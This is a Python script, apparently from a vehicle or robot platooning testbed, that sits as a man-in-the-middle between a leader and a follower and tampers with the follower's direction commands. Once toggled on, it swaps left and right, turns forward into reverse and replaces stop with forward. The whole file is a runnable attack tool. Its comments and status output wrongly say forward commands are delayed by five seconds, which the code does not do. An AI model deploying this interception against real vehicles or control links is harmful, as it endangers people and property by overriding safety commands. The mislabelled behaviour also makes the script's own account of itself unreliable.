import socket
import threading
import time

# Global variables
attack_enabled = True  # Attack starts enabled
toggle_lock = threading.Lock()  # For thread safety when toggling

def handle_leader_to_follower(leader_conn, follower_conn):
    try:
        while True:
            data = leader_conn.recv(1024)
            if not data:
                print("Leader disconnected")
                break
            
            original_data = data.decode('utf-8')
            print(f"Original data: {original_data}")
            
            # Get current attack state in thread-safe manner
            with toggle_lock:
                currently_enabled = attack_enabled
            
            # Parse the data
            try:
                leader_speed, key = original_data.split(',')
                
                if currently_enabled:
                    # Manipulate the direction key only when attack is enabled
                    manipulated_key = manipulate_direction(key)
                    modified_data = f"{leader_speed},{manipulated_key}"
                    print(f"Leader → Follower: {original_data} → {modified_data}")
                    follower_conn.sendall(modified_data.encode('utf-8'))
                else:
                    # Pass through unmodified when attack is disabled
                    print(f"Leader → Follower: {original_data} (passing through)")
                    follower_conn.sendall(data)
            except Exception as e:
                print(f"Error processing data: {e}")
                # Forward original data if parsing fails
                follower_conn.sendall(data)
    except Exception as e:
        print(f"Leader-to-follower error: {e}")

def manipulate_direction(key):
    """
    Manipulate only the direction command sent from leader to follower.
    Speed remains unchanged.
    """
    # === EXAMPLES OF DIRECTION MANIPULATION ===
    
    # Example 1: Reverse directions
    if key == 'a':
        return 'd'  # Change left to right
    elif key == 'd':
        return 'a'  # Change right to left
    
    # Example 2: Delay certain commands
    if key == 'w':
        return 's'  # Add a 5-second delay to forward movement
    
    # Example 3: Block stopping
    if key == 'f':
        return 'w'  # Replace stop with forward
    
    # Default: Pass through unchanged
    return key

def toggle_attack():
    """Toggle the attack state on/off"""
    global attack_enabled
    with toggle_lock:
        attack_enabled = not attack_enabled
        status = "ENABLED" if attack_enabled else "DISABLED"
        print(f"\n[!] Attack mode {status}")

def handle_commands():
    """Simple command handler for toggling attack"""
    global attack_enabled
    
    print("\n=== MITM ATTACK CONTROL ===")
    print("Type 'toggle' to turn attack on/off")
    print("Type 'status' to show current status")
    print("Type 'exit' to quit")
    
    while True:
        command = input("\nCommand> ").strip().lower()
        
        if command == "toggle":
            toggle_attack()
        elif command == "status":
            status = "ENABLED" if attack_enabled else "DISABLED"
            print(f"Attack is currently {status}")
        elif command == "exit":
            print("Exiting...")
            break
        else:
            print("Unknown command. Use 'toggle', 'status', or 'exit'")

def start_mitm():
    # Connect to the leader
    leader_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("MITM connecting to leader...")
    try:
        leader_socket.connect(('192.168.1.30', 12345))  # Connect to leader's IP
        print("Connected to leader")
    except Exception as e:
        print(f"Failed to connect to leader: {e}")
        return
    
    # Accept connection from the follower
    follower_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    follower_server.bind(('0.0.0.0', 12346))
    follower_server.listen(1)
    print("MITM waiting for follower connection...")
    
    follower_conn, follower_addr = follower_server.accept()
    print(f"Follower connected from {follower_addr}")
    
    print("\n=== MITM ATTACK ACTIVE ===")
    print("Currently manipulating: Direction commands only")
    print("Active manipulations:")
    print("- Left/Right directions reversed")
    print("- Forward movement delayed by 5 seconds")
    print("- Stop commands replaced with forward")
    
    # Start thread to handle communication from leader to follower
    threading.Thread(target=handle_leader_to_follower, 
                     args=(leader_socket, follower_conn), 
                     daemon=True).start()
    
    # Start command interface on main thread
    handle_commands()
    
    # Clean up before exit
    print("Closing connections...")
    leader_socket.close()
    follower_conn.close()

if __name__ == "__main__":
    start_mitm()